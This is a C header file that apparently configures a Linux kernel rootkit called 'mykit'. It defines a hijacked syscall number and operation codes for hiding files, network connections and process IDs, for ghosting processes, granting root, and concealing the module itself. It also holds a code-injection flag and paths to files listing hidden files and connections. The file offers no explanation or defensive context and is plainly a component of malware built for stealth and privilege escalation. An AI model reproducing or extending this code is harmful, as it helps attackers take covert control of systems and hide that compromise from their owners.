#ifndef _NE_CONFIG_H
#define _NE_CONFIG_H

#define SYS_mycall      210

#define OP_HIDE_FILE    0x001
#define OP_UNHIDE_FILE  0x002
#define OP_HIDE_CONN    0x004
#define OP_UNHIDE_CONN  0x008
#define OP_HIDE_PID     0x010
#define OP_UNHIDE_PID   0x020
#define OP_GHOST_PID    0x040
#define OP_GET_ROOT     0x080
#define OP_GET_LEET     0x100
#define OP_UNLEET       0x200
#define OP_UNHIDEME     0x400
#define OP_RELOAD_CONF  0x800


#define INJECT_CODE

struct nethide {
    int lport;
    int fport;
    int laddr;
};

char *sz_conf_dir = "/home/mykit";

char *sz_hidden_files_filename = "/home/mykit/hidden_files.conf";
char *sz_hidden_conns_filename = "/home/mykit/hidden_conns.conf";

#define MAX_PASSWORD_LEN 256

#endif
